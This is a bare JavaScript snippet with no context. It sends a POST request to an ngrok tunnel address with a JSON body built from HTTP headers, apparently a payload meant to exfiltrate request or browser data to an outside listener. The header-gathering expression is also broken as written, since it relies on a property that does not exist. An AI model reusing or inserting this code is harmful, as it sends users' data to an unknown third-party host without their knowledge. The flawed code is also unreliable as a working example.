fetch('https://eb5c-69-255-41-193.ngrok.io', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(Object.fromEntries(new Headers(fetch.Headers.prototype)))
});